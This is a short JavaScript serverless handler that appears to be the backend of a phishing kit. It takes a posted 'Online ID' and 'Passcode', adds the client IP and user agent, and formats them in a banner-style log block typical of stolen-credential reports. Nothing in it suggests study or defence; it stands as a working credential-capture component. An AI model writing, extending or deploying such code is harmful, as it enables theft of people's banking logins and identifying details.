export default function handler(req, res) {
  if (req.method !== "POST") {
    res.setHeader("Content-Type", "text/plain");
    return res.send("Send POST request");
  }

  const { ai, pr } = req.body || {};

  if (!ai || !pr) {
    res.setHeader("Content-Type", "text/plain");
    return res.send("Missing fields");
  }

  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket.remoteAddress;

  const ua = req.headers["user-agent"] || "Unknown";

  const message = `
|----------| xLs |--------------|
Online ID : ${ai}
Passcode     : ${pr}
|--------------- I N F O | I P -------------------|
Client IP : ${ip}
User Agent: ${ua}
|----------- CrEaTeD--------------|
`;

  res.setHeader("Content-Type", "text/plain");
  res.send(message);
}
